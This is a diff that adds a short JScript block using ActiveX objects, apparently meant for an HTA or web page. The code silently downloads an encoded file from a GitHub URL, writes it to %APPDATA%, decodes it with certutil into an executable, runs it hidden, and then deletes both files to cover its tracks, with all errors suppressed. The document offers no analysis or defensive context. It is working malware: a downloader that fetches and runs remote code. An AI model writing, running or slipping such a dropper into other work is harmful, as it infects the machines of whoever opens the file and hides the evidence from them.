@@ -1,0 +1,33 @@
+<script language="JScript">
+  try {
+
+    var shell = new ActiveXObject("WScript.Shell"),        
+        xhr   = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0"),
+        ado   = new ActiveXObject("ADODB.Stream"),      
+        fso   = new ActiveXObject("Scripting.FileSystemObject");
+
+    xhr.open("GET", "https://github.com/maxnajer/test_2/raw/refs/heads/main/control.enc", false);
+    xhr.send();
+    var blob = xhr.responseBody;  
+
+
+    var tempFolder = shell.ExpandEnvironmentStrings("%APPDATA%");
+    var encPath    = tempFolder + "\\" + Math.floor(Math.random()*9000+1000) + ".enc";
+    ado.Type = 1;  
+    ado.Open();
+    ado.Write(blob);
+    ado.SaveToFile(encPath, 2);  
+    ado.Close();
+
+    var exePath = encPath.replace(/\.enc$/i, ".exe");
+    shell.Run("certutil -decode \"" + encPath + "\" \"" + exePath + "\"", 0, true);
+
+    shell.Run("\"" + exePath + "\"", 0, false);
+    fso.DeleteFile(encPath);
+
+    shell.Run("cmd /c ping -n 10 127.0.0.1>nul & del /q \"" + exePath + "\"", 0, false);
+
+  } catch (e) {
+
+  }
+</script>
